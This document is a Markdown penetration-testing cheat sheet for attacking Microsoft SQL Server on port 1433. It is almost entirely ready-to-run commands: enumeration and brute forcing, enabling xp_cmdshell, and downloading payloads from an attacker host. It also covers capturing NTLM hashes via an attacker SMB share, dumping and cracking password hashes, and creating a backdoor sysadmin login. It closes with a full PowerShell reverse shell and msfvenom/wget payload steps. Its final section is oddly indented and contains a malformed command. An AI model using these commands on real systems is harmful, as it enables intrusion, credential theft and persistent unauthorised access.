# Port 1433 - MSSQL

## Table of Contents
- [Enumeration](#enumeration)
  - [Impacket](#impacket)
  - [sqsh](#sqsh)
  - [NetExec](#netexec)
  - [Nmap Scripts](#nmap-scripts)
- [BruteForce](#brute-force)
- [Exploit](#exploit)
  - [xp_cmdshell](#xp_cmdshell)
  - [File Operations](#file-operations)
  - [Hash Capture](#hash-capture)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Impacket

```shell
# Windows authentication
impacket-mssqlclient DOMAIN/user:password@$rhost -windows-auth

# SQL authentication
impacket-mssqlclient sa:password@$rhost

# Pass-the-Hash
impacket-mssqlclient user@$rhost -hashes :NTHASH
```

### sqsh

```shell
# SQL authentication
sqsh -S $rhost -U sa -P password

# Windows authentication
sqsh -S $rhost -U DOMAIN\\username -P password
```

### Basic SQL Queries

```shell
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM master..sysusers;
SELECT name FROM master.sys.server_principals;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### NetExec

```shell
nxc mssql $rhost -u '' -p '' --local-auth --continue-on-success --no-bruteforce
```

- List Database

    ```shell
    nxc mssql $rhost -u 'user' -p 'pass' --local-auth -q "SELECT name FROM sys.databases;"
    ```

- List Permission

    ```shell
    nxc mssql $rhost -u 'user' -p 'pass' --local-auth -q "SELECT * FROM sys.server_permissions;"
    ```

### Nmap Scripts

```shell
# Service detection
nmap -p 1433 $rhost

# Instance discovery (UDP 1434)
nmap -sU -p 1434 --script ms-sql-discover $rhost

# Brute force
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

### Metasploit

```shell
# Instance discovery
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS $rhost
run

# Login check
use auxiliary/scanner/mssql/mssql_login
set RHOSTS $rhost
run
```

---

## BruteForce

### NetExec

```shell
nxc mssql $rhost -u /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt -p /usr/share/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt  --local-auth
```

### Hydra

```shell
hydra -L userlist.txt -P passlist.txt mssql://$rhost
hydra -l sa -P /usr/share/wordlists/rockyou.txt $rhost mssql
```

---

## Exploit

### xp_cmdshell

#### Enable xp_cmdshell

```shell
# Via NetExec
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Via SQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### Execute Commands

```shell
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';

# Via NetExec
nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "whoami"
```

### File Operations

#### Read Files

```shell
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

EXEC xp_cmdshell 'type C:\Windows\win.ini';
```

#### Write Files

```shell
EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';

# Download from web
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker/shell.exe -OutFile C:\Temp\shell.exe"';
```

### Hash Capture

> Force MSSQL to authenticate to attacker SMB share

```shell
# Start Responder
sudo responder -I eth0

# On MSSQL
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share\file';
EXEC master..xp_subdirs '\\attacker-ip\share';
```

---

## Post-Exploitation

### Password Hash Extraction

```shell
# Extract password hashes (requires sysadmin)
SELECT name, password_hash FROM sys.sql_logins;

# Using Metasploit
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS $rhost
set USERNAME sa
set PASSWORD password
run

# Crack with hashcat
hashcat -m 1731 hashes.txt rockyou.txt
```

### Impersonation

```shell
# Check for impersonation permissions
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

# Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### Linked Server Exploitation

```shell
# List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

# Execute on linked server
EXEC ('SELECT @@version') AT [LinkedServerName];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
```

### Persistence

```shell
# Create backdoor user
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

### Reverse Shell

```shell
# PowerShell reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker-ip'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

            ```shell
            nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "C:\Users\Public\shell.exe"
            ```
    
    - Linux
        - Attacker
            ```shell
            msfvenom -p php/reverse_php LHOST=eth0 LPORT=4444 -o reverse.php
            ```

            ```shell
            msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD php/reverse_php; set LHOST eth0; set LPORT 4444; exploit -j'
            ```

            ```shell
            python3 -m http.server 8080
            ```
        
        - Victim

            ```shell
            nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "wget http://<attacker_ip>:8080/reverse.php""
            ```

            ```shell
            nxc mssql $rhost -u 'user' -p 'pass' --local-auth -x "php reverse.php"
            ```